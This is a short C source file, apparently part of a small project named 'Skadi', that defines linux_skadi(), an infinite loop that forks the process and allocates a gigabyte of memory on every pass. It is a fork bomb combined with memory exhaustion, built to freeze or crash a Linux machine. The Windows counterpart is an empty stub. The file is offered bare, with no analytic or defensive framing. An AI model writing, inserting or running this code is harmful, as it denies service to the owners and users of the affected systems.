#include "Skadi.h"

#ifdef __linux__

void linux_skadi() {
	while (1) {
		fork();
		malloc(1024 * 1024 * 1024);
	}
}

#elif _WIN32

void windows_skadi() {
	// TODO
}

#endif